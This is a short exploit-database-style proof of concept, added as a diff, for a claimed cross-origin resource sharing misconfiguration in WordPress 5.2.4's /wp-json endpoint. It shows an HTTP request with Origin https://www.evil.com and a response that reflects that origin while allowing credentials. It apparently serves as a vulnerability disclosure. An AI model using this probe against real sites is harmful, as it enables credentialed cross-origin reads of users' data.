@@ -1,0 +1,46 @@
+# Exploit Title: Wordpress 5.2.4 - Cross-Origin Resource Sharing
+# Date: 2019-10-28
+# Exploit Author: Milad Khoshdel
+# Software Link: https://wordpress.org/download/
+# Version: Wordpress 5.2.4
+# Tested on: Linux Apache/2 PHP/7.2
+
+# Vulnerable Page:
+https://[Your-Domain]/wp-json
+
+# POC:
+# The web application fails to properly validate the Origin header (check Details section for more information) 
+# and returns the header Access-Control-Allow-Credentials: true. In this configuration any website can issue 
+# requests made with user credentials and read the responses to these requests. Trusting arbitrary 
+# origins effectively disables the same-origin policy, allowing two-way interaction by third-party web sites. 
+
+# REGUEST -->
+
+GET /wp-json/ HTTP/1.1
+Origin: https://www.evil.com
+Accept: */*
+Accept-Encoding: gzip,deflate
+Host: [Your-Domain]
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21
+Connection: Keep-alive
+
+# RESPONSE -->
+
+HTTP/1.1 200 OK
+Date: Mon, 28 Oct 2019 07:34:39 GMT
+Server: NopeJS
+X-Robots-Tag: noindex
+Link: <https://[Your-Domain].com/wp-json/>; rel="https://api.w.org/"
+X-Content-Type-Options: nosniff
+Access-Control-Expose-Headers: X-WP-Total, X-WP-TotalPages
+Access-Control-Allow-Headers: Authorization, Content-Type
+Allow: GET
+Access-Control-Allow-Origin: https://www.evil.com
+Access-Control-Allow-Methods: OPTIONS, GET, POST, PUT, PATCH, DELETE
+Access-Control-Allow-Credentials: true
+Vary: Origin,Accept-Encoding,User-Agent
+Keep-Alive: timeout=2, max=73
+Connection: Keep-Alive
+Content-Type: application/json; charset=UTF-8
+Original-Content-Encoding: gzip
+Content-Length: 158412
